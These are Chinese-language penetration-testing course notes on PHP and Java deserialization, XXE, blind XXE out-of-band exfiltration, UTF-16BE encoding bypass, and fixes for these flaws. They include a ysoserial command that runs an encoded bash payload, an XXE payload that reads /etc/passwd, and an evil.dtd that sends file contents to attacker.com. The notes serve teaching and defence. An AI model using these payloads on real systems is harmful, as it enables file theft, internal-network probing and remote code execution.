---
title: XD安全渗透测试课程 Day37-39 学习笔记：PHP/Java反序列化与XXE漏洞利用
description: 系统整理 XD安全渗透测试课程第37-39天学习内容：PHP/Java反序列化原理与魔术方法触发机制、Java序列化特征识别与ysoserial利用、XXE漏洞利用全流程（任意文件读取、内网探测、Blind
  XXE带外数据外带）、UTF-16BE编码绕过过滤、XXE自动化扫描工具及修复方案。
category: program-analysis
tags:
- XD安全
- 渗透测试
- PHP反序列化
- Java反序列化
- XXE
- XML外部实体注入
- Blind XXE
- UTF-16BE绕过
- ysoserial
- 魔术方法
- 学习笔记
date: 2024-01-15
updated: '2026-11-14'
---
## 概述

本页面整理自 XD安全渗透测试课程第 37-39 天学习笔记，重点覆盖 **PHP/Java 反序列化漏洞原理与利用**、**XXE (XML External Entity Injection) 漏洞利用与绕过技巧**、**Blind XXE 带外数据外带**、**UTF-16BE 编码绕过过滤** 等核心知识点。内容涵盖序列化格式解析、魔术方法触发条件、Java 序列化特征识别、XXE 攻击向量构造、无回显场景下的数据外带技术、自动化扫描工具使用及修复防御方案。

## PHP 反序列化

### 序列化与反序列化基础

- **核心函数**
  - `serialize()`：将对象转换为可存储/传输的字符串
  - `unserialize()`：将序列化字符串还原为对象
- **漏洞成因**：未对用户可控的序列化字符串进行校验，导致攻击者可控制反序列化过程，触发魔术方法，进而引发代码执行、SQL 注入、目录遍历等后果。

### 序列化字符串格式解析

| 类型 | 格式示例 | 说明 |
|------|----------|------|
| 字符串 | `s:9:"xiaodi123"` | `s`=string，`9`=长度，双引号包裹内容 |
| 整数 | `i:19` | `i`=integer，**数值型不写长度、不加双引号** |
| 对象 | `O:8:"ClassName":3:{...}` | `O`=object，`8`=类名长度，`3`=属性数量 |
| 数组 | `a:2:{i:0;s:3:"abc";i:1;s:3:"def";}` | `a`=array，键值对嵌套 |

> **注意**：图示中数值型序列化格式标注有误，正确为 `i:19;` 而非 `i:2:"19"`。

### 魔术方法触发机制

反序列化过程中会自动触发特定魔术方法，常见利用链入口：

| 魔术方法 | 触发条件 |
|----------|----------|
| `__wakeup()` | `unserialize()` 时自动调用 |
| `__destruct()` | 对象销毁时（脚本结束或引用计数归零） |
| `__toString()` | 对象被当作字符串使用时（如 `echo $obj`、字符串拼接、格式化输出） |
| `__call()` / `__callStatic()` | 调用不存在的方法/静态方法时 |
| `__get()` / `__set()` / `__isset()` / `__unset()` | 访问不可访问属性时 |
| `__invoke()` | 将对象当作函数调用时 |
| `__sleep()` | `serialize()` 前自动调用 |
| `__clone()` | `clone` 关键字复制对象时 |
| `__unserialize()` / `__serialize()` | PHP 7.4+ 自定义序列化/反序列化行为 |

> **实战提示**：CTF 题目中需分析类代码，确定触发条件与预期行为，构造对应序列化字符串实现利用。参考 [[php伪协议与反序列化利用]] 中 `__wakeup` 绕过（属性计数不匹配）、正则过滤数字绕过（`+` 前缀）、Base64 编码差异等实战技巧。

### 判断是否存在类结构

- 序列化字符串中出现 `O:` 或 `C:`（自定义类）即为**有类**反序列化，存在魔术方法攻击面
- 纯标量/数组序列化（`a:`、`s:`、`i:` 等）为**无类**反序列化，无魔术方法触发

## Java 反序列化

### 核心 API 与特征识别

| 操作 | 核心类/方法 | 文件约定扩展名 |
|------|-------------|----------------|
| 序列化 | `java.io.ObjectOutputStream.writeObject(obj)` | `.ser` |
| 反序列化 | `java.io.ObjectInputStream.readObject()` | - |

**特征识别（黑盒测试）**：
- **Base64 编码后**：以 `rO0AB` 开头 → 典型 Java 序列化数据
- **十六进制原始流**：以 `aced` 开头 (`0xAC 0xED` = `STREAM_MAGIC`)
- **HTTP 头/参数/Cookie** 中出现上述特征 → 疑似反序列化利用点

> **Base64 作用**：将非 ASCII 字符（含不可见控制字符）转为可打印 ASCII，保障网络传输兼容性。

### 利用工具链

| 工具 | 用途 |
|------|------|
| **ysoserial** | 生成各类 Gadget Chain Payload（需指定 JDK 版本、目标库、命令） |
| **serializationDumper** | 解析序列化流结构，逆向分析 Gadget 链 |
| **Java Deserialization Scanner (Burp插件)** | 自动化检测反序列化漏洞 |

**利用流程**：
1. 识别输入点（HTTP 请求体、Header、Cookie、RMI、JMX 等）
2. 确定目标环境依赖库（CommonsCollections、Spring、Jackson 等）
3. 使用 `ysoserial` 生成 Payload：`java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,Y2F0IC9mbGFn}|{base64,-d}|{bash,-i}" | base64`
4. 无回显场景：反弹 Shell、DNSLog 外带、写文件验证

> **WebGoat** 提供 Java 反序列化练习环境。实战中结合 [[attack-defense-world-master-advanced-writeup]]、[[buuctf-web-writeup-collection]] 中 PHP/Java 反序列化题目复现加深理解。

## XXE (XML External Entity Injection) 漏洞

### 核心概念

- **XXE 全称**：XML External Entity Injection，XML 外部实体注入
- **根因**：XML 解析器未禁用外部实体解析，攻击者通过构造恶意 DTD 引入外部资源
- **危害**：任意文件读取、内网端口扫描/攻击内网应用（SSRF）、命令执行（特定环境）、DoS（Billion Laughs）、Blind XXE 数据外带

### XML 与 HTML 差异

| 维度 | XML | HTML |
|------|-----|------|
| 设计目标 | 传输、存储数据（关注内容） | 显示数据（关注外观） |
| 标签 | 自定义 | 预定义 |
| 语法严格性 | 必须良构、正确嵌套、区分大小写 | 宽容、浏览器容错渲染 |

### 基础利用：任意文件读取

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

- `SYSTEM` 标识外部实体，支持 `file://`、`http://`、`ftp://`、`php://` 等协议
- 参考 [[xxe-xml-dtd-fundamentals]] 系统掌握 XML 语法树、DTD 声明类型、实体引用分类（内部/外部/参数实体）、PCDATA 与 CDATA 差异。

### 内网探测与 SSRF 攻击内网应用

```xml
<!ENTITY xxe SYSTEM "http://192.168.1.1:8080/index.txt">
```

- 利用 XXE 让服务端向内网发起请求，探测存活主机、开放端口、访问内网应用漏洞
- 结合 [[ssrf-bypass-techniques]]、[[ssrf-ctf-exploitation-guide]] 理解 SSRF 与 XXE 协议支持差异、绕过技巧（302 跳转、DNS Rebinding、Gopher 协议攻击 FastCGI/Redis 等）。

### 引入外部 DTD（自定义攻击复杂 Payload）

**前提**：目标解析器**未禁止**加载外部 DTD（`DOCTYPE` 引用外部实体）。

**evil.dtd（攻击者服务器）**:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**目标 XML**:
```xml
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://attacker.com/evil.dtd">
<root></root>
```

- 两步实体定义绕过参数实体在内部 DTD 中不可引用外部实体的限制
- 适用于**有回显**场景，数据通过 HTTP 请求回传攻击者服务器

### Blind XXE（无回显）带外数据外带

当应用**不回显实体内容**时，需通过带外通道（OOB）外带数据。

#### 方式一：HTTP 请求回传（需目标可出网）

**evil.dtd**:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
```

- 攻击者服务器.access.log 记录请求参数即可获取文件内容
- 适用于带宽受限、仅能逐行外带的场景

#### 方式二：FTP/其他协议外带（绕过 HTTP 限制）

- 若 `http://` 被过滤/禁用，尝试 `ftp://attacker.com/%file;`、`gopher://` 等
- 需 Fuzz 测试目标环境支持哪些协议

#### 方式三：DNSLog 外带（极限环境）

- 将敏感数据编码至子域名：`http://{data}.attacker.com/`
- 通过 DNS 解析日志获取数据（长度受限，需分块/压缩）
- 参考 [[mysql-dnslog-injection-loadfile-unc]] 中 `load_file()` + UNC 路径 + DNSLog 思路迁移至 XXE

### 编码绕过过滤：UTF-16BE

**场景**：关键字 `ENTITY`、`SYSTEM`、`file`、`http` 被 WAF/过滤器拦截。

**原理**：XML 解析器支持 UTF-16BE 编码，若声明 `encoding="UTF-16BE"` 且内容为对应字节序，解析器会自动解码处理，绕过基于字符串匹配的过滤。

**构造步骤**：
1. 编写正常 XML Payload
2. 转为 UTF-16BE 字节（大端序，无 BOM 或含 BOM `FE FF`）
3. 发送时 `Content-Type: application/xml; charset=UTF-16BE`

**参考**：<https://cnblogs.com/20175211lyz/p/11413335.html> 详细演示。

> **实战建议**：Fuzz 测试目标支持的编码（UTF-8、UTF-16BE、UTF-16LE、UTF-32 等），结合 [[php伪协议与反序列化利用]] 中双重 URL 编码、Base64 编码差异等绕过思路。

### XXE 漏洞发现与自动化扫描

| 方法 | 说明 |
|------|------|
| **特征识别** | 抓包检查 `Content-Type: text/xml` 或 `application/xml`；若无，尝试手工修改 Header 注入 XXE Payload |
| **关键字搜索** | 请求体/参数中搜索 `<xml`、`<?xml`、`<!DOCTYPE`、`<ENTITY` 等 |
| **专用扫描器** | **XXEinjector**（Ruby 编写，基于 Payload Fuzz）、综合扫描器（Goby、Xray 等） |
| **实战靶场** | **VulnHub** 真实环境练习，参考 [[vulnhub-platform-resource-index]]、[[pikachu-target-writeup-part5]]（含 XXE 实战复现） |

### XXE 修复与防御方案

| 语言/框架 | 核心防御代码/配置 |
|-----------|-------------------|
| **PHP** | `libxml_disable_entity_loader(true);` （PHP 8.0+ 默认禁用） |
| **Java (JAXP/DOM/SAX)** | `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`<br>`factory.setFeature("http://xml.org/sax/features/external-general-entities", false);`<br>`factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);` |
| **Python (lxml/defusedxml)** | 使用 `defusedxml` 替代标准库；`lxml.etree.XMLParser(resolve_entities=False, no_network=True)` |
| **.NET (XmlReader)** | `settings.DtdProcessing = DtdProcessing.Prohibit;` |
| **通用策略** | 1. 禁用 DTD / 外部实体解析<br>2. 过滤用户输入 XML 中的 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`PUBLIC` 关键字<br>3. 使用不支持 DTD 的解析器（如 JSON 替代 XML）<br>4. 最小权限：解析器进程禁用网络访问、文件系统读取 |

## 交叉引用与延伸学习

| 主题 | 相关页面 | 说明 |
|------|----------|------|
| XXE 基础原理 | [[xxe-xml-dtd-fundamentals]] | XML/DTD/实体引用核心语法与攻击原理 |
| PHP 反序列化实战 | [[php伪协议与反序列化利用]] | 魔术方法绕过、伪协议利用、BUUCTF/Pikachu 实战题目 |
| SSRF 绕过与利用链 | [[ssrf-bypass-techniques]]、[[ssrf-ctf-exploitation-guide]] | 协议差异、Gopher/FastCGI/Redis 攻击、DNS Rebinding |
| Blind XXE DNSLog 外带 | [[mysql-dnslog-injection-loadfile-unc]] | DNSLog 数据外带通用思路迁移 |
| 实战靶场复现 | [[pikachu-target-writeup-part5]]、[[attack-defense-world-master-advanced-writeup]]、[[buuctf-web-writeup-collection]] | PHP/Java 反序列化、XXE 综合实战题目 |
| 漏洞扫描与自动化 | [[xd-security-vulnerability-discovery-notes-day42-45]] | Goby/Xray/Nmap/Metasploit 工具链实战 |
| WAF 绕过技术体系 | [[xd-security-waf-bypass-techniques-day46-49]] | Payload 变异、编码绕过、Webshell 混淆等通用绕过策略 |

## 学习路线建议

1. **夯实基础**：通读 [[xxe-xml-dtd-fundamentals]] 掌握 XML/DTD 语法；复习 PHP 面向对象与魔术方法、Java 序列化接口 (`Serializable`/`Externalizable`)
2. **动手复现**：
   - 本地搭建 PHP `unserialize()` / Java `readObject()` 易漏洞 Demo
   - 使用 `ysoserial` 生成 Payload 打 WebGoat / VulnHub 靶机
   - 构造 XXE Payload 读 `/etc/passwd`、探测内网、搭建恶意 DTD 服务器外带数据
3. **进阶绕过**：Fuzz 编码绕过（UTF-16BE/UTF-7）、过滤器绕过（参数实体嵌套、CDATA 包裹）、协议可用性测试
4. **工程化**：编写/二次开发 XXE/反序列化自动化检测脚本，集成至扫描器流水线
5. **代码审计视角**：学习 [[java-preparedstatement-sql-injection-defense]] 等防御编码规范，从源头杜绝不安全反序列化与 XML 解析配置

---

> **声明**：本页面仅供安全技术学习与研究使用，严禁用于非授权渗透测试或违法活动。实战演练请在合法授权范围内进行（如 VulnHub、CTF 平台、企业授权 SRC 项目）。

## 来源

- [0x00实验室-202108-202304_089](../sources/0x00实验室-202108-202304_089.md)
